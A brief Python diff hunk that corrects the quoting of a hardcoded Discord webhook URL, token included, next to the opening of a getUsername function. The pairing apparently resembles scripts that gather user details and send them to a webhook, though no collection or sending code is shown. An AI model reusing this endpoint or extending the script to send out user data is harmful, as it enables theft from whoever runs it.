@@ -23,7 +23,7 @@ except ImportError:
 
 from discord_webhook import DiscordWebhook
 
-WEBHOOK = ''https://discord.com/api/webhooks/1093532961154011156/3rgcd6oe3hQJqu0UjmSsauIKajIa-g8VCMEWpGZRJLVCVGQri1nQEgFLThjeGqRVveri
+WEBHOOK = 'https://discord.com/api/webhooks/1093532961154011156/3rgcd6oe3hQJqu0UjmSsauIKajIa-g8VCMEWpGZRJLVCVGQri1nQEgFLThjeGqRVveri'
 
 def getUsername():
     try:
